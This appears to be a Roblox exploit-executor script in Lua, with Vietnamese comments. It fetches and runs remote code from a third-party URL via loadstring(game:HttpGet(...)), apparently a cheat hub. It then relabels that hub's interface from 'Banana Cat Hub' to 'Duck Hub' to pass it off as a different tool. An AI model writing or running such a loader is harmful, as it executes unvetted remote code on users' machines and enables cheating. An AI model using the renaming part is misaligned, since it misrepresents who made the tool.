-- Chay script GOC, khong sua code, khong hook gi => giong het chay binh thuong
task.spawn(function()
    loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_JJiynqcQCJ8Iu/stream/init"))()
end)

-- Chi doi chu tren giao dien (nhan UI), khong dong vao code cua script
local function fix(s)
    for _, p in ipairs({
        {"BANANA CAT HUB","Duck Hub"},
        {"Banana Cat Hub","Duck Hub"},
        {"BANANA HUB","Duck Hub"},
        {"Banana Hub","Duck Hub"},
        {"BananaHub","DuckHub"},
    }) do
        s = s:gsub(p[1]:gsub("%p","%%%0"), p[2])
    end
    return s
end

local function patch(o)
    if o:IsA("TextLabel") or o:IsA("TextButton") then
        local function chk()
            local t = o.Text
            if t:lower():find("banana") then
                local n = fix(t)
                if n ~= t then o.Text = n end
            end
        end
        chk()
        o:GetPropertyChangedSignal("Text"):Connect(chk)
    end
end

task.wait(3) -- doi script tao UI xong
local roots = {game:GetService("CoreGui"), game.Players.LocalPlayer:WaitForChild("PlayerGui")}
if gethui then table.insert(roots, gethui()) end
for _, r in ipairs(roots) do
    for _, d in ipairs(r:GetDescendants()) do patch(d) end
    r.DescendantAdded:Connect(patch)
end
